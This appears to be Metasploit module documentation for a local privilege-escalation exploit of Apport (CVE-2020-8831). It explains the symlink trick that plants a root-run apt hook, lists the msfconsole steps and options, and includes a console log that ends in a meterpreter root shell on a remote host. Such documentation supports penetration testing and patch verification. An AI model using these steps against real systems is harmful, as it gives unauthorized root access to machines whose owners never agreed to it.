## Description

	Apport is a utility for writing crash reports and on versions <= 2.20.11 there 
	exists a vulnerable `check_lock` function which suffers from the 'confused deputy 
	problem', and hence will inadvertantly follow symbolic links from /var/lock/apport 
	when writing lock files. Eseentially, this vulnerably allows and attacker to 
	arbitrarily create root owned world readable, writable and executable files by 
	creating a symbolic link to `/var/lock/apport/ `and then triggering a crash which
	will be logged by apport. 

	To achieve privillege escalation this module first creates a symlink from `/var/lock/
	apport/` to /etc/apt/apt.conf.d/. Then it triggers a crash a root owned file which 
	is world readable, writable and executable /etc/apt/apt.conf.d/lock will be written.
	Next the module writes a payload which by default is written to /home/ubuntu/. 

	An apt hook is a way of prepending commands to apt package operations. With the
	 `/etc/apt/apt.conf.d/lock` file we write our own apt hooks. This module will 
	 trigger the payload on the following apt commands: `apt-get upgrade`, 
	`apt-get update` and `apt-get install`. Once one of these are run a new root
	session will be spawned. 

## Vulnerable Application

	Apport versions <= 2.20.11 are vulnerable to symlink hijacking due to a vunerable 
	function `check_lock` which will inadvertently follow symbolic links from `/var/lock/
	apport/`. This package can be installed with `sudo dpkg -i apport_2.20.11-0ubuntu21_all.deb`. 

## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/linux/local/cve_2020_8831_apport_symlink_privesc`
  4. Do: `set SESSION [SESSION]`
  5. Do: `check`
  6. Do: `run`
  7. You should get a new root session

## Options

### SESSION

  Which session to use, which can be viewed with `sessions`

### PAYLOAD_FILENAME

	Name of the payload file which will be executed by the apt hook. Is random by 
	default.

### HOOK_PATH
	
	Path to the apt configuration directory, default is `/etc/apt/apt.conf.d/`

### WRITABLE_DIR 

	A directory we can write to, this is where the payload file will be written to. 
	Default is `/home/ubuntu`.

## Advanced Options

### REMOVE_LOCK_DIR

	When set to true the `/var/lock/apport/` directory will be removed if it already 
	exists.

## Scenarios

```
msf6 exploit(linux/local/cve_2020_8831_apport_symlink_privesc) > use exploit/multi/handler
[*] Using configured payload linux/x86/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set rhost 18.212.162.161
rhost => 18.212.162.161
msf6 exploit(multi/handler) > 
rmsf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 18.212.162.161:5555
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
runmsf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 18.212.162.161:7777
[*] Sending stage (1017704 bytes) to 18.212.162.161
[-] Meterpreter session 4 is not valid and will be closed
[*] 18.212.162.161 - Meterpreter session 4 closed.
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp 
payload => linux/x64/meterpreter/bind_tcp
rmsf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 18.212.162.161:7777
[*] Sending stage (3045380 bytes) to 18.212.162.161
[*] Meterpreter session 5 opened (192.168.0.239:57606 -> 18.212.162.161:7777) at 2025-10-14 15:49:00 -0400
meterpreter > shell
Process 5791 created.
Channel 1 created.
whoami
root
```